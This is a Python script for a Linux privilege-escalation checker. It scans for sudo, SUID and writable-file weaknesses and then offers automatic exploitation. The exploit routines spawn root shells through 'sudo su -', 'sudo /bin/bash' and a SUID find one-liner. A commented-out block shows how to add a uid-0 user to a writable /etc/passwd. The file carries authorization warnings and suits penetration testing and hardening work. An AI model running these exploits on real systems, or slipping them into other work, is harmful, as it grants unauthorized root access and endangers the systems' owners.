# privesc_checker.py

import os
import subprocess
from checks.sudo_check import check_sudo_misconfigurations
from checks.suid_sgid_checks import check_suid_sgid_binaries
from checks.writable_files import check_writable_critical_files
from checks.kernel import check_kernel_version
from checks.home_dir import check_home_directory_permissions
from checks.advanced_checks import run_all_advanced_checks

from utils.findings import findings_collector, Severity # Import the collector and Severity


def print_banner():
    """Prints a simple banner for the tool."""
    print("=" * 50)
    print("  Linux Privilege Escalation Checker  ")
    print("=" * 50)
    print(f"\n{findings_collector.COLORS[Severity.CRITICAL]}!!! WARNING: This tool identifies vulnerabilities and can attempt exploitation. !!!{findings_collector.COLORS['RESET']}")
    print(f"{findings_collector.COLORS[Severity.CRITICAL]}!!! Use ONLY on systems you own and have explicit, written permission for. !!!{findings_collector.COLORS['RESET']}")
    print("\nScanning for potential privilege escalation vectors...\n")


def attempt_exploit(title: str, command: list):
    """
    Attempts to execute a given command for exploitation, with user confirmation.
    """
    print(f"\n{findings_collector.COLORS[Severity.CRITICAL]}!!! AUTOMATIC EXPLOIT ATTEMPT !!!{findings_collector.COLORS['RESET']}")
    print(f"Attempting exploit for: {title}")
    print(f"Command to be executed: {' '.join(command)}")
    
    confirm = input("Are you absolutely sure you want to proceed with this exploit? (yes/no): ").lower()
    if confirm != 'yes':
        print("Exploit attempt cancelled by user.")
        return False
    
    print(f"\nExecuting: {' '.join(command)}")
    try:
        # Use Popen to allow for interactive shell after successful exploit
        # This will block until the new shell exits, or a timeout is reached.
        # For a full interactive shell handover, libraries like `pty` (pty.spawn) are more robust.
        # For this project, we'll try to execute and inform the user.
        
        # If it's a command like 'sudo su -' or '/bin/bash', it might spawn a new interactive shell.
        # We handle this by setting a timeout and printing instructions.
        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        
        print("Attempting to gain root shell...")
        print("If successful, you might be dropped into a root shell or see root output. Type 'exit' to return here.")
        
        # Communicate with a timeout. If it times out, it's likely waiting for user input or has spawned a shell.
        stdout, stderr = process.communicate(timeout=15) # Increased timeout to 15 seconds

        if process.returncode == 0:
            print(f"{findings_collector.COLORS[Severity.CRITICAL]}[+] Exploit command executed successfully!{findings_collector.COLORS['RESET']}")
            if stdout:
                print("Command Output:")
                print(stdout)
            print("Check your privileges (e.g., run 'whoami') in the new shell if it spawned.")
            return True
        else:
            print(f"{findings_collector.COLORS[Severity.LOW]}[-] Exploit command failed with exit code {process.returncode}.{findings_collector.COLORS['RESET']}")
            if stdout:
                print("Stdout:")
                print(stdout)
            if stderr:
                print("Stderr:")
                print(stderr)
            return False

    except FileNotFoundError:
        print(f"{findings_collector.COLORS[Severity.LOW]}[-] Exploit command not found: '{command[0]}'.{findings_collector.COLORS['RESET']}")
        return False
    except subprocess.TimeoutExpired:
        print(f"{findings_collector.COLORS[Severity.LOW]}[-] Exploit command timed out. This often means it spawned an interactive shell.{findings_collector.COLORS['RESET']}")
        print("Please check your terminal for a new root shell. You may need to press ENTER.")
        process.kill() # Terminate the process if it timed out to clean up
        return True # Assume success if it timed out (likely spawned a shell)
    except Exception as e:
        print(f"{findings_collector.COLORS[Severity.CRITICAL]}[!] An unexpected error occurred during exploitation: {e}{findings_collector.COLORS['RESET']}")
        return False


def run_auto_exploitation_all_findings():
    """
    Analyzes collected findings and attempts automatic exploitation for
    all high-priority, automatble vulnerabilities.
    """
    print("\n" + "=" * 50)
    print("        ATTEMPTING AUTOMATIC EXPLOITATION        ")
    print("=" * 50)
    print(f"{findings_collector.COLORS[Severity.CRITICAL]}!!! WARNING: This feature will attempt to gain root access. !!!{findings_collector.COLORS['RESET']}")
    print(f"{findings_collector.COLORS[Severity.CRITICAL]}!!! Use ONLY on systems you own and have explicit permission for. !!!{findings_collector.COLORS['RESET']}")
    print(f"{findings_collector.COLORS[Severity.CRITICAL]}!!! It will attempt ALL detected viable exploits. !!!{findings_collector.COLORS['RESET']}")


    exploited_any = False
    findings = sorted(findings_collector.get_findings(), key=lambda f: f.severity, reverse=True)

    for finding in findings:
        # SUDO NOPASSWD (ALL) - Highest priority, most direct
        if finding.check_type == "SUDO Misconfiguration" and "SUDO ALL Commands Allowed" in finding.title and finding.severity >= Severity.CRITICAL:
            print(f"\n{findings_collector.COLORS[Severity.CRITICAL]}Found CRITICAL SUDO ALL Misconfiguration!{findings_collector.COLORS['RESET']}")
            print("Attempting to get a root shell via `sudo su -`...")
            if attempt_exploit("SUDO ALL Commands Allowed (su -)", ["sudo", "su", "-"]):
                exploited_any = True
                # Even if successful, we continue to show all attempts if requested.
                # If a direct shell is spawned, the user might need to 'exit' from it
                # to allow the script to continue to the next exploit attempt.
            else:
                print("Trying `sudo /bin/bash` instead...")
                if attempt_exploit("SUDO ALL Commands Allowed (/bin/bash)", ["sudo", "/bin/bash"]):
                    exploited_any = True

        # SUID 'find' exploitation
        elif finding.check_type == "SUID/SGID Binaries" and "find" in finding.title and finding.severity >= Severity.HIGH:
            find_path = finding.details.split(" ")[0] # Extract the path from details
            if os.path.exists(find_path):
                print(f"\n{findings_collector.COLORS[Severity.HIGH]}Found HIGH Severity SUID '{os.path.basename(find_path)}' binary!{findings_collector.COLORS['RESET']}")
                print(f"Attempting to exploit SUID '{find_path}' via GTFOBins one-liner...")
                # The GTFOBins command for find is `find . -exec /bin/sh \; -quit`
                exploit_cmd = [find_path, ".", "-exec", "/bin/sh", "\\;", "-quit"]
                if attempt_exploit(f"SUID find exploitation ({find_path})", exploit_cmd):
                    exploited_any = True

        # --- Add more specific automated exploits here if needed ---
        # Example for Writable /etc/passwd (EXTREMELY RISKY, requires careful handling)
        # This is a very powerful exploit, but requires specific user input for new user/pass
        # and carries high risk of system damage if not handled perfectly.
        # It's commented out due to its complex and destructive nature for general automation.
        # elif finding.check_type == "Writable Critical Files" and "/etc/passwd" in finding.title and finding.severity >= Severity.CRITICAL:
        #     print(f"\n{findings_collector.COLORS[Severity.CRITICAL]}Found CRITICAL Writable /etc/passwd!{findings_collector.COLORS['RESET']}")
        #     print("This exploit will add a new root user to /etc/passwd.")
        #     print(f"{findings_collector.COLORS[Severity.CRITICAL]}Highly recommended to MANUALLY BACKUP /etc/passwd FIRST!{findings_collector.COLORS['RESET']}")
        #     new_user = input("Enter new username to add (e.g., 'pwned'): ").strip()
        #     new_pass = input("Enter password for new user: ").strip()
        #     if not new_user or not new_pass:
        #         print("Username or password cannot be empty. Skipping /etc/passwd exploit.")
        #         continue
        #     # Generate a password hash (requires `openssl` to be installed)
        #     pass_hash_output = subprocess.run(["openssl", "passwd", "-1", new_pass], capture_output=True, text=True, errors='ignore', check=False)
        #     if pass_hash_output.returncode != 0:
        #         print(f"Could not generate password hash: {pass_hash_output.stderr.strip()}. Is 'openssl' installed?")
        #         continue
        #     pass_hash = pass_hash_output.stdout.strip()
        #     
        #     passwd_line = f"{new_user}:{pass_hash}:0:0:root exploit:/root:/bin/bash"
        #     print(f"Attempting to append '{passwd_line}' to /etc/passwd...")
        #     # Using `sh -c` to ensure redirection works correctly
        #     if attempt_exploit(f"Writable /etc/passwd (add user '{new_user}')", ["sh", "-c", f"echo '{passwd_line}' >> /etc/passwd"]):
        #         print(f"{findings_collector.COLORS[Severity.CRITICAL]}SUCCESS: User '{new_user}' added to /etc/passwd. Try `su {new_user}` to login as root.{findings_collector.COLORS['RESET']}")
        #         exploited_any = True
        #     else:
        #         print("Failed to add user to /etc/passwd.")
        # -------------------------------------------------------------

    if not exploited_any:
        print("\nNo automated exploitation paths were attempted or successful based on current findings.")
    
    print("=" * 50)
    print("    AUTOMATIC EXPLOITATION ATTEMPT COMPLETE    ")
    print("=" * 50 + "\n")


def main():
    """Main function to orchestrate the vulnerability checks and optional exploitation."""
    print_banner()

    # Call the check functions from their respective modules
    check_sudo_misconfigurations()
    check_suid_sgid_binaries()
    check_writable_critical_files()
    check_kernel_version()
    check_home_directory_permissions()
    run_all_advanced_checks() # This function now internally uses findings_collector

    print("\nScan complete. Generating summary and recommendations...\n")
    findings_collector.print_summary() # Print the summarized findings

    # Ask user if they want to attempt auto-exploitation
    if findings_collector.get_findings(): # Only ask if there are findings
        auto_exploit_confirm = input(f"\n{findings_collector.COLORS[Severity.CRITICAL]}Do you want to attempt automatic exploitation for ALL viable findings? (yes/no): {findings_collector.COLORS['RESET']}").lower()
        if auto_exploit_confirm == 'yes':
            run_auto_exploitation_all_findings()
        else:
            print("Automatic exploitation skipped.")
    else:
        print("No findings to attempt exploitation for.")

    print("\nTool execution finished.")

if __name__ == "__main__":
    main()